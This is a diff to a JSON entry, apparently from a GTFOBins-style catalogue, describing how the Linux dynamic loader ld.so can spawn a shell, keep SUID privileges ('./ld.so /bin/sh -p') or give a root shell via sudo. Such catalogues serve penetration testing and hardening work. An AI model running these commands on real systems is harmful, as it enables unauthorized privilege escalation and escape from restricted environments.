@@ -1,19 +1,21 @@
 {
-  "description": "'ld.so' is the Linux dynamic linker/loader, its filename and location might change across distributions. The proper path is can be obtained with:\n```\n$ strings /proc/self/exe | head -1\n/lib64/ld-linux-x86-64.so.2\n```",
   "functions": {
     "shell": [
       {
-        "code": "/lib/ld.so /bin/sh"
+        
+        "code": "/lib/ld.so /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "code": "./ld.so /bin/sh -p"
+        
+        "code": "./ld.so /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo /lib/ld.so /bin/sh"
+        
+        "code": "sudo /lib/ld.so /bin/sh\n"
       }
     ]
   }
